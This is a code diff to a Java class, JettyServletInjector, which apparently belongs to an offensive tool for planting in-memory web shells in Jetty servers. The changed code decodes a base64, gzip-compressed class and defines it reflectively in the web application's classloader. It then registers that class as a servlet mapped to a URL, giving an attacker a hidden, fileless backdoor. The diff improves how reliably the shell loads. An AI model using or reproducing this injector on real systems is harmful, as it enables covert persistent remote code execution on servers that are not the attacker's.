@@ -81,16 +81,24 @@ public class JettyServletInjector {
         return contexts;
     }
 
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader"));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "_classLoader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = context.getClass().getClassLoader();
+        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
+            return webAppClassLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
             return clazz.newInstance();
         }
     }
@@ -103,7 +111,6 @@ public class JettyServletInjector {
             return;
         }
 
-        ClassLoader classLoader = context.getClass().getClassLoader();
 
         String[] classNames = new String[]{
                 "org.eclipse.jetty.servlet.ServletHolder",
@@ -114,10 +121,11 @@ public class JettyServletInjector {
         };
 
         Class<?> servletHolderClass = null;
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
 
         for (String className : classNames) {
             try {
-                servletHolderClass = context.getClass().getClassLoader().loadClass(className);
+                servletHolderClass = contextClassLoader.loadClass(className);
             } catch (ClassNotFoundException ignored) {
             }
         }
@@ -129,7 +137,7 @@ public class JettyServletInjector {
         Constructor<?> servletHolderConstructor = servletHolderClass.getDeclaredConstructor();
         servletHolderConstructor.setAccessible(true);
         Object servletHolder = servletHolderConstructor.newInstance();
-        invokeMethod(servletHolder, "setServlet", new Class[]{getServletClass(classLoader)}, new Object[]{servlet});
+        invokeMethod(servletHolder, "setServlet", new Class[]{getServletClass(contextClassLoader)}, new Object[]{servlet});
         invokeMethod(servletHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(servletHandler, "addServlet", new Class[]{servletHolderClass}, new Object[]{servletHolder});
         invokeMethod(servletHandler, "addServletWithMapping", new Class[]{servletHolderClass, String.class}, new Object[]{servletHolder, getUrlPattern()});
